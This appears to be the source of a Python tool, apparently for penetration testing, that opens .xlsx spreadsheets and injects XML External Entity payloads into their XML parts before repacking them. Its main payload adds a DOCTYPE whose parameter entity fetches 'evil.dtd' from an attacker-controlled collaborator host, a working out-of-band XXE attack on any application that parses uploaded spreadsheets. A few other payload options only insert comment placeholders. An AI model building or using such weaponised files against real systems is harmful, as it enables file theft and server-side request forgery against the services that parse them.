import os, zipfile, tempfile, shutil, uuid, logging
from datetime import datetime
from werkzeug.utils import secure_filename


class XLSXProcessor:
    def __init__(self, processed_dir="processed"):
        self.processed_dir = processed_dir
        os.makedirs(self.processed_dir, exist_ok=True)

    def inject_xxe(self, input_path, payload_type, payload, collaborator=""):
        if not input_path or not input_path.endswith(".xlsx"):
            raise ValueError("Invalid input path")
        work_dir = os.path.join(tempfile.gettempdir(), "xxe_" + uuid.uuid4().hex[:8])
        os.makedirs(work_dir, exist_ok=True)
        try:
            name = secure_filename(os.path.basename(input_path))
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            out_name = "xxe_{}_{}" .format(ts, name)
            out_path = os.path.join(self.processed_dir, out_name)
            with zipfile.ZipFile(input_path, "r") as zf:
                for m in zf.namelist():
                    if ".." in m or m.startswith("/"):
                        raise ValueError("Unsafe path: " + m)
                zf.extractall(work_dir)
            modified = self._process_xml_files(work_dir, payload_type, payload, collaborator)
            with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(work_dir):
                    for f in files:
                        fp = os.path.join(root, f)
                        zf.write(fp, os.path.relpath(fp, work_dir))
            return {
                "success": True,
                "output_filename": out_name,
                "modified_files": modified,
                "message": "Injected XXE into {} file(s)".format(len(modified))
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)

    def _process_xml_files(self, directory, payload_type, payload, collaborator):
        modified = []
        for root, dirs, files in os.walk(directory):
            for f in files:
                if not (f.endswith(".xml") or f.endswith(".rels")):
                    continue
                fp = os.path.join(root, f)
                try:
                    content = open(fp, "r", encoding="utf-8").read()
                    new = self._inject(content, payload_type, payload, collaborator)
                    if new != content:
                        open(fp, "w", encoding="utf-8").write(new)
                        modified.append(f)
                except Exception as e:
                    logging.error("Error processing {}: {}".format(f, e))
        return modified

    def _inject(self, content, payload_type, payload, collaborator):
        if "<?xml" not in content:
            return content
        lines = content.split("\n")
        result = []
        done = False
        for line in lines:
            result.append(line)
            if not done and "<?xml" in line:
                if payload_type == "doctype":
                    result.append('<!DOCTYPE xxe [\n<!ENTITY % xxe SYSTEM "{}/evil.dtd">\n%xxe;\n]>'.format(collaborator))
                elif payload_type == "xinclude":
                    result.append('<!-- XInclude href="{}" parse="text" xmlns:xi="http://www.w3.org/2001/XInclude" -->'.format(payload))
                elif payload_type in ("dtd", "svg"):
                    result.append("<!-- {} payload injected -->".format(payload_type.upper()))
                done = True
        return "\n".join(result)

    def analyze_xlsx_structure(self, input_path):
        if not input_path or not input_path.endswith(".xlsx"):
            raise ValueError("Invalid input path")
        structure = {"xml_files": [], "injection_points": [], "metadata": {}}
        tmp = os.path.join(tempfile.gettempdir(), "analyze_" + uuid.uuid4().hex[:8])
        os.makedirs(tmp, exist_ok=True)
        try:
            with zipfile.ZipFile(input_path, "r") as zf:
                files = zf.namelist()
                structure["metadata"]["total_files"] = len(files)
                for f in files:
                    if ".." in f or f.startswith("/"):
                        continue
                    if f.endswith(".xml") or f.endswith(".rels"):
                        structure["xml_files"].append(f)
                        zf.extract(f, tmp)
                        content = open(os.path.join(tmp, f), "r", encoding="utf-8").read()
                        if "<?xml" in content:
                            structure["injection_points"].append({"file": f, "size": len(content)})
        except Exception as e:
            logging.error("Analysis error: {}".format(e))
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
        return structure
